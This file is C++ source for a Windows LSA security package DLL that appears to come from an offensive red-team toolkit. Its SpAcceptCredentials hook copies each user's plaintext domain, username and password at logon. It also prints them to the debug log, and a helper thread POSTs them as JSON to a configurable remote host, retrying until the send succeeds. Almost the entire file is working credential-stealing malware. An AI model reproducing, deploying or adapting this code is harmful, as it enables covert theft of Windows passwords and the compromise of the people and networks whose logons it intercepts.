#define SECURITY_WIN32
#include <Windows.h>
#include <stdint.h>
#include <errno.h>
#include <sspi.h>
#include <NTSecAPI.h>
#include <ntsecpkg.h>

#include <monstars/http.h>
#include <monstars/logging.h>
#include <monstars/memory.h>
#include <monstars/mutex.h>
#include <monstars/object.h>
#include <monstars/util.h>

#include "provider.h"

SECPKG_FUNCTION_TABLE g_SecurityPackageFunctionTable = {};

// SpAcceptCredentials seems to be called twice per authentication
//   - add a cooldown to avoid redundant POST requests
monstars::Cooldown g_cooldown(c_ReauthCooldown);

wchar_t g_LastAuthUser[MAX_PATH] = {};

// stampable values - configured via web interface or helper script
constexpr wchar_t c_Hostname[128] = L"EVERYBODYGETUP";
constexpr wchar_t c_AuthToken[] = L"00000000-0000-0000-0000-000000000000";

NTSTATUS
NTAPI
SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable)
{
    DEBUG_PRINTW(L"SpInitialize called for domain: %s\n", Parameters->DomainName.Buffer);

    return STATUS_SUCCESS;
}

NTSTATUS
NTAPI
SpShutdown(void)
{
    DEBUG_PRINTW(L"SpShutdown called\n");

    return STATUS_SUCCESS;
}

NTSTATUS
NTAPI
SpGetInfo(SecPkgInfoW* PackageInfo)
{
    DEBUG_PRINTW(L"SpGetInfo called\n");

    PackageInfo->Name = const_cast<SEC_WCHAR*>(c_PackageName);
    PackageInfo->Comment = const_cast<SEC_WCHAR*>(c_PackageComment);
    PackageInfo->fCapabilities = c_PackageCapabilities;
    PackageInfo->wRPCID = SECPKG_ID_NONE;
    PackageInfo->cbMaxToken = 0;
    PackageInfo->wVersion = c_PackageVersion;

    return STATUS_SUCCESS;
}

DWORD SendCredsAsync(void* credsPtr)
{
    monstars::HeapBuffer credsBuf(credsPtr);
    auto creds = credsBuf.Get<bang::Creds>();

    monstars::HeapBuffer jsonBuf(MAX_PATH);
    auto jsonPayload = jsonBuf.Get<wchar_t>();

    wsprintfW(jsonPayload, c_JsonTemplate, c_AuthToken, creds->Domain, creds->User, creds->Password);
    int jsonLen = lstrlenW(jsonPayload) * sizeof(wchar_t);

    DEBUG_PRINTW(L"%s\n", jsonPayload);

    uint32_t attempts = c_ConnectAttempts;
    do
    {
        monstars::HttpClient client(c_Hostname);
        if (client.PostRequest(c_Endpoint, jsonBuf.Get(), jsonLen, c_ContentType))
        {
            return ERROR_SUCCESS;
        }
        if (client.Forbidden())
        {
            return ERROR_ACCESS_DENIED;
        }
        if (--attempts) Sleep(c_RetryInterval);
    } while (attempts);

    DEBUG_PRINTW(L"failed to send creds after %ld attempts\n", c_ConnectAttempts);

    return ERROR_TIMEOUT;  // not checked anywhere, doesn't matter
}

NTSTATUS
NTAPI
SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName,
    PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{
    DEBUG_PRINTW(L"SpAcceptCredentials called\n");

    if (PrimaryCredentials->Password.Length)
    {
        // skip if we *just* got creds for this user
        if (g_cooldown || lstrcmpW(AccountName->Buffer, g_LastAuthUser))
        {
            monstars::memset(g_LastAuthUser, 0, sizeof(g_LastAuthUser));
            monstars::memcpy(g_LastAuthUser, sizeof(g_LastAuthUser), AccountName->Buffer, AccountName->Length);

            monstars::HeapBuffer credsBuf(sizeof(bang::Creds));
            if (credsBuf)
            {
                auto creds = credsBuf.Get<bang::Creds>();
                monstars::memcpy(creds->Domain, sizeof(creds->Domain), PrimaryCredentials->DomainName.Buffer,
                    PrimaryCredentials->DomainName.Length);
                monstars::memcpy(creds->User, sizeof(creds->User), AccountName->Buffer, AccountName->Length);
                monstars::memcpy(creds->Password, sizeof(creds->Password), PrimaryCredentials->Password.Buffer,
                    PrimaryCredentials->Password.Length);

                DEBUG_PRINTW(L"%s\\%s:%s\n", creds->Domain, creds->User, creds->Password);

                // release creds buffer here; free in helper thread
                monstars::ObjectHandle thread = CreateThread(NULL, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SendCredsAsync),
                    credsBuf.Release(), 0, NULL);
            }
        }
    }

    return STATUS_SUCCESS;
}

// SpLsaModeInitialize is called by LSA for each registered Security Package
extern "C"
__declspec(dllexport)
NTSTATUS
NTAPI
SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE* ppTables, PULONG pcTables)
{
    DEBUG_PRINTW(L"SpLsaModeInitialize called\n");

    g_SecurityPackageFunctionTable.Initialize = SpInitialize;
    g_SecurityPackageFunctionTable.Shutdown = SpShutdown;
    g_SecurityPackageFunctionTable.GetInfo = SpGetInfo;
    g_SecurityPackageFunctionTable.AcceptCredentials = SpAcceptCredentials;

    *PackageVersion = SECPKG_INTERFACE_VERSION;
    *ppTables = &g_SecurityPackageFunctionTable;
    *pcTables = 1;

    return STATUS_SUCCESS;
}

extern "C"
BOOL
WINAPI
DllMain(HINSTANCE hInstance, DWORD reason, LPVOID reserved)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(reserved);

    switch (reason)
    {
    case DLL_PROCESS_ATTACH:
        DEBUG_PRINTW(L"process attach\n");
        break;
    case DLL_PROCESS_DETACH:
        DEBUG_PRINTW(L"process detach\n");
        break;
    default:
        break;
    }

    return TRUE;
}